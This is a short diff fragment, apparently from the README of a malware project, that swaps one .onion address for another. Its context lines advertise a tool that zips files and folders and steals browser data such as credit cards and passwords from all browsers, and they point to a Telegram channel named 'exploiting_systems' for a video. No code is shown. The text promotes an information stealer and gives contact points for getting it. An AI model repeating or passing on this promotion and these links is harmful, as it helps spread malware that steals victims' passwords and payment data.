@@ -8,4 +8,4 @@ zip files and folders, steal all browserdata on all browsers(credit cards, passw
 
 Video at t.me/exploiting_systems
 
-# http://wt2vgku53iec4txxzhmw5a3x4nmih4j5ytxqr2qi6pudrm37lvvrndid.onion/
+# http://s75pg5hp2u3lhanfm4rhuel4rbj2qpxo4ykcdzcoyrlhoxjcjbfbofid.onion
